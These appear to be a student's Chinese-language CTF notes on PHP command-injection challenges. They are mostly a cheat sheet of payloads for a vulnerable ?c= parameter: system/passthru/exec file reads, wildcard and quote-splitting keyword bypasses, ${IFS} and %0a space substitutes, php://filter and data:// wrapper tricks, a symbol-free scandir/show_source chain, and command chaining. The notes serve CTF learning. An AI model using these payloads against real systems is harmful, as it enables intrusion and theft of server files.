CTF 命令执行常用笔记（跟随题目记录）

基础文件操作命令

ls - 列出目录内容

?c=system(‘ls’);

?c=system(‘ls -la’); 显示所有文件（包括隐藏文件）

?c=system(‘ls /‘); 列出根目录

cat - 查看文件内容

?c=system(‘cat flag.php’);

?c=system(‘cat /flag’);

?c=system(‘cat /var/www/html/flag.txt’);

pwd - 显示当前路径

?c=system(‘pwd’);

cd - 切换目录

?c=system(‘cd /var/www && ls’);

关键词绕过技巧

1.通配符绕过

?c=system(‘cat f*’); # 匹配所有f开头的文件

?c=system(‘cat fla*’); # 匹配fla开头的文件

?c=system(‘cat lag‘); # 匹配文件名包含lag的文件

* 匹配任意长度（包括0）

? 匹配恰好一个字符，如果 * 被禁，但知道文件名长度，可以用多个 ? 代替

? 匹配恰好一个字符，常用来代替点号 .（如 flag?php）

2.拼接绕过

?c=system(‘cat fl’’ag.php’);

?c=system(‘cat fla’’g.php’);

?c=system(‘cat f’’l’’a’’g.php’);

3.转义拆分

\：拆分关键词绕过过滤（fl\ag.php 实际读 flag.php）

查看文件类型

?c=system(‘file flag.php’);

查看文件权限

?c=system(‘ls -la flag.php’);

?c=system(‘stat flag.php’);

查看当前目录所有文件内容

?c=system(‘cat *’);

查看根目录

?c=system(‘ls /‘);

当system被禁，可以考虑用什么来替代system执行系统命令。主要有passthru、exec，还可以用反引号

例如?c=passthru(‘tac f‘); 还可以用url/?c=echotac f*;*

exec()

· 作用：执行系统命令，结果存到数组，不自动显示

· 示例：?c=exec(‘ls’, $out); print_r($out);

空格绕过：${IFS} 和 %0a

· ${IFS}：代替空格（Linux 环境变量）

示例：?c=passthru(‘tac${IFS}f*’);

· %09可代替空格

示例：?c=include%09$_GET[1]

include

· 作用：包含并执行文件

· 示例：include ‘flag.php’;

· 进阶：结合 $_GET[1] 和伪协议绕过过滤

示例：?c=include**%0a**$_GET[1]&1=php://filter/convert.base64-encode/resource=flag.php9 （%0a 换行符 绕过空格过滤）

在 CTF 里

- 文件存在时，include 和 require 效果一样

- 可以互换使用

- 结合 $_GET[1] 和伪协议可以绕过过滤

示例：?c=require%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

php://filter 伪协议

· 作用：读取文件并做过滤处理

· 常用过滤器：convert.base64-encode（转 base64，避免被执行）

· 示例：php://filter/convert.base64-encode/resource=flag.php

$_GET

· 作用：从 URL 获取参数值

· 示例：$_GET[‘c’] 就是 ?c=… 里的值

可以用 $_GET[1] 把文件名藏在第二个参数里

在 CTF 里

文件存在时，include 和 require 效果一样，可以互换使用

结合 $_GET[1] 和伪协议可以绕过过滤

示例：?c=require%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

数组下标不加引号

写法

$_GET[a] 等价于 $_GET[‘a’]

原理

PHP 先找常量 a，没找到就当成字符串 ‘a’

优点：绕过引号过滤（因为没写引号）

示例

?c=include%0a$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php

Data伪协议

格式**：data://text/plain,这里写内容**

// data:// 协议：代码在 shell 中执行

?c=data://text/plain,<?php system('cat fl*'); ?>

// shell 看到 “fl*”，扩展成 “flag.php”

// php://filter：PHP 直接操作文件

?c=php://filter/convert.base64-encode/resource=fla?.php

// PHP 寻找文件 “fla?.php”（? 是文件名的一部分）

php://filter 只读文件，不执行里面的 PHP 代码 → 不会定义 $flag

· data:// 把你写的代码当文件执行 → 可以定义 $flag

PHP 短标签 <?=

作用:

不含 “php” 这个词，可绕过 php 关键词过滤

在 CTF 里的用法

?c=data://text/plain,<?= system('cat f*'); ?>

无符号文件读取题

题目特征

过滤了几乎所有特殊符号（数字、引号、点号、斜杠、空格等）

只允许传字母和括号

有 eval($c)，可以执行代码

核心限制

· 不能直接写 ‘flag.php’（有引号和点号）

· 不能直接写 system(‘cat flag.php’)（有引号和点号）

解题思路

用纯字母的 PHP 函数拼出文件名，再用文件读取函数显示。

关键函数 函数作用
localeconv() 返回一个数组，第一项永远是 .（点号）
pos() / current() 取数组当前指向的元素，这里取到 .
scandir() 列出指定目录下的所有文件和目录，返回数组
array_reverse() 把数组顺序反过来
next() 把数组内部指针往后移一位，并返回当前指向的值
show_source() 高亮显示文件源码（等价于 highlight_file）

标准 payload

?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

执行流程

  1. localeconv() → 返回数组，第一项是 .

  2. pos(localeconv()) → 取出 .

  3. scandir(‘.’) → 列出当前目录所有文件，得到数组：

    [‘.’, ‘..’, ‘flag.php’, …]

  4. array_reverse() → 反转数组：

    […, ‘flag.php’, ‘..’, ‘.’]

  5. next() → 数组指针后移一位，拿到 ‘flag.php’

  6. show_source(‘flag.php’) → 显示 flag 文件源码

为什么要反转数组?

· scandir() 返回的数组里，. 和 .. 在最前面

· 默认指针指向第一个元素（.）

· 反转后，. 跑到了最后，flag.php 更靠近前面

· 这样用一次 next() 就能拿到 flag.php，不用多次移动

核心思想:用纯字母函数代替被禁的符号，最终拼出读文件的操作。

命令连接符

; && ||

; 顺序执行多条命令 cat flag.php;ls 不管前一条成功失败，都执行后一条

&& 前一条成功才执行后一条 cat flag.php&&ls ，可代替 ; 绕过过滤

|| 前一条命令失败，才执行后一条，cat flag.php||ls（如果 cat 失败才执行 ls）

用 ; 或 && 拆命令，让重定向只作用于最后一条

· 当 ; 被禁时，改用 &&

· 当 && 被禁时，改用 ||
